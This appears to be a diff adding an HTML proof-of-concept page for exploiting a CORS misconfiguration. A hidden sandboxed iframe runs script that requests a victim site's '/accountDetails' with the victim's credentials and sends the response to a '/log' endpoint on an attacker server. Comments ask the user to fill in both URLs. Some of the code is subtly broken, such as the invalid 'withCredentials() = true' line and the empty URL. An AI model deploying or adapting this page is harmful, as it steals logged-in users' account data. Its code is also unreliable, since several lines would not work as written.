@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Hello World!</h1>
+    <iframe style="display: none;" sandbox="allow-scripts " src="
+    <script>
+        var xhr = new XMLHttpRequest();
+        var url = 'https://'          
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == XMLHttpRequest.DONE) {
+                fetch("/log?key" + xhr.responseText)
+            }
+        }           
+        xhr.open('GET', url + "/accountDetails", true);
+        xhr.withCredentials() = true;
+        xhr.send(null);
+    </script>"></iframe>
+    // Before executing this one please change the request url
+    // Add url of server in fetch action before /log 
+</body>
+</html>
